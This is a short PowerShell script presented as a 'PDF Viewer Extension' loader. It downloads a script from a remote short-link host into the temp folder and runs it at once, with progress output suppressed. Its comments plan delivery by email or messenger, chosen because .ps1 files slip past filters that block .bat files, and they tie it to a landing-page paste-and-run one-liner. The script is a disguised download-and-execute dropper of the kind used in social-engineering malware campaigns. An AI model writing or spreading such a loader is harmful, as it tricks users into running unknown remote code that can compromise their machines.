# ============================================================
# PDF Viewer Extension - run-pdf-viewer.ps1
# Thin loader identical to the landing-page one-liner.
# Use when delivery happens as a .ps1 file (right-click ->
# Run with PowerShell), e.g. email/IM/messenger cases where .bat
# is filtered but .ps1 passes.
# NOT for double-click from Explorer (double-click opens the
# editor); call it from a .bat or paste its content instead.
# ============================================================

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

# One-liner from wln.ink (Win+R variant): download cfg.ps1 and dot-source it.
$cfg = Join-Path $env:TEMP 'c.ps1'
Invoke-WebRequest -Uri 'https://wln.ink/i' -OutFile $cfg -UseBasicParsing
. $cfg